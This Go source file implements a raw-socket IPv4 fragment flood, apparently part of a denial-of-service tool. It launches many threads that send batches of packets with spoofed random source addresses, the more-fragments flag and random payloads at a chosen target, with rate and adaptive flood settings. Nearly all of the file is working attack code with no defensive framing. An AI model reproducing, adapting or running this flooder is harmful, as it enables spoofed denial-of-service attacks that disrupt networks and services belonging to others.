//go:build linux

package core

import (
	"byter/utils"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"sync"
	"syscall"
	"time"
)

var l3PayloadPool [][]byte

func initL3Pool() {
	if l3PayloadPool != nil {
		return
	}
	l3PayloadPool = make([][]byte, 8)
	for i := range l3PayloadPool {
		sz := 64 + rand.Intn(960)
		b := make([]byte, sz)
		rand.Read(b)
		l3PayloadPool[i] = b
	}
}

func L3Fragment(st *EngineState, stop <-chan struct{}) error {
	initL3Pool()

	cfg := st.L3
	target := cfg.Target
	if target == "" {
		target = st.Global.Target
	}
	rate := cfg.Rate
	if rate == 0 {
		rate = st.Global.Rate
	}
	threads := cfg.Threads
	if threads == 0 {
		threads = st.Global.Threads
	}
	flood := cfg.Flood
	if flood == 0 && st.Global.Flood != 0 {
		flood = st.Global.Flood
	}
	batch := cfg.BatchSize
	if batch < 1 {
		batch = 256
	}

	dst := net.ParseIP(target).To4()
	if dst == nil {
		return fmt.Errorf("target không hợp lệ: %s", target)
	}
	dst4 := utils.AddrTo4(dst)

	var addr syscall.SockaddrInet4
	copy(addr.Addr[:], dst)

	fmt.Printf("[L3] -> %s | threads=%d rate=%d flood=%s batch=%d\n",
		target, threads, rate, flood, batch)

	var wg sync.WaitGroup
	for t := 0; t < threads; t++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			l3WorkerBatch(st, &addr, dst4, flood, rate, batch, &cfg, stop)
		}()
	}

	<-stop
	wg.Wait()
	return nil
}

func l3WorkerBatch(st *EngineState, addr *syscall.SockaddrInet4, dst4 [4]byte, flood FloodMode, rate, batch int, cfg *L3Config, stop <-chan struct{}) {
	rl := NewRateLimiter(flood, rate)
	lastAdapt := time.Now()

	pkts := make([][]byte, batch)
	for i := range pkts {
		pkts[i] = make([]byte, 1500)
	}

	for {
		select {
		case <-stop:
			return
		default:
		}

		for i := 0; i < batch; i++ {
			src := randomSrcIP()
			src4 := utils.AddrTo4(src)
			ipID := uint16(rand.Uint32())
			if !cfg.FuzzID {
				ipID = uint16(12345)
			}
			ttl := uint8(32 + rand.Intn(96))
			payload := l3PayloadPool[rand.Intn(len(l3PayloadPool))]

			buildL3Packet(pkts[i], src4, dst4, ipID, ttl, 0, 1, payload)
		}

		n := utils.SendBatch(st.RawFD, pkts, addr)
		if n > 0 {
			st.Counters.IncSuccess(n * 100)
		} else {
			st.Counters.IncFail()
		}

		if flood == FloodAdaptive && time.Since(lastAdapt) > time.Second {
			rl.Adapt(st.Counters)
			lastAdapt = time.Now()
		}
		rl.Wait()
	}
}

func buildL3Packet(buf []byte, src, dst [4]byte, ipID uint16, ttl uint8, fragOff, mf uint16, payload []byte) int {
	plen := len(payload)
	if 20+plen > len(buf) {
		plen = len(buf) - 20
	}
	buf[0] = 0x45
	buf[1] = 0
	binary.BigEndian.PutUint16(buf[2:], uint16(20+plen))
	binary.BigEndian.PutUint16(buf[4:], ipID)
	binary.BigEndian.PutUint16(buf[6:], (mf<<13)|fragOff)
	buf[8] = ttl
	buf[9] = 17
	binary.BigEndian.PutUint16(buf[10:], 0)
	copy(buf[12:16], src[:])
	copy(buf[16:20], dst[:])
	copy(buf[20:20+plen], payload[:plen])
	binary.BigEndian.PutUint16(buf[10:], utils.IPChecksum(buf[:20]))
	return 20 + plen
}

func randomSrcIP() net.IP {
	for {
		b := make([]byte, 4)
		rand.Read(b)
		if b[0] == 0 || b[0] == 127 || b[0] >= 224 {
			continue
		}
		return net.IPv4(b[0], b[1], b[2], b[3]).To4()
	}
}